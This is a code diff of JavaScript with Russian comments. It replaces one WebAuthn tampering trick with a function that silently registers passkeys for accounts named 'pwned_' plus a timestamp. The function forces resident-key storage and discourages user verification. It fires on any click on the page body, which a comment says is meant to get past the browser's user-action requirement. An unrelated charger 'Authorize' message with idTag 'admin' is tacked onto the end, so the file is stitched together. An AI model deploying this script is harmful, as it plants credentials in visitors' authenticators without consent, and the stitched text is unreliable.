@@ -1,10 +1,47 @@
-const origCreate = navigator.credentials.create.bind(navigator.credentials);
-navigator.credentials.create = async (opts) => {
-    opts.publicKey.authenticatorSelection.residentKey = "required";
-    opts.publicKey.authenticatorSelection.requireResidentKey = true;
-    return await origCreate(opts);
-};
-document.body.onclick = () => registerPasskey('owned');
+async function forceResidentKey() {
+    const username = 'pwned_' + Date.now();
+    console.log("Начинаем регистрацию для", username);
+    
+    const beginResp = await fetch('/register/begin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username }),
+    });
+    const options = await beginResp.json();
+
+    // Форсируем сохранение ключа на уровне API
+    const publicKeyOptions = {
+        challenge: base64UrlToBuffer(options.challenge),
+        rp: options.rp,
+        user: {
+            id: base64UrlToBuffer(options.user.id),
+            name: options.user.name,
+            displayName: options.user.displayName,
+        },
+        pubKeyCredParams: options.pubKeyCredParams,
+        authenticatorSelection: {
+            residentKey: 'required', // Жесткое требование
+            requireResidentKey: true,
+            userVerification: 'discouraged'
+        }
+    };
+
+    const credential = await navigator.credentials.create({ publicKey: publicKeyOptions });
+
+    await fetch('/register/complete', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            credentialId: bufferToBase64Url(credential.rawId),
+            clientDataJSON: bufferToBase64Url(credential.response.clientDataJSON),
+            attestationObject: bufferToBase64Url(credential.response.attestationObject),
+        }),
+    });
+    console.log("УСПЕХ! Ключ сохранен для юзера: " + username);
+}
+
+// Вешаем вызов на клик, чтобы браузер не ругался на отсутствие действий пользователя
+document.body.onclick = () => forceResidentKey();
 
 
 [2, "msg-6", "Authorize", {"idTag": "admin"}]
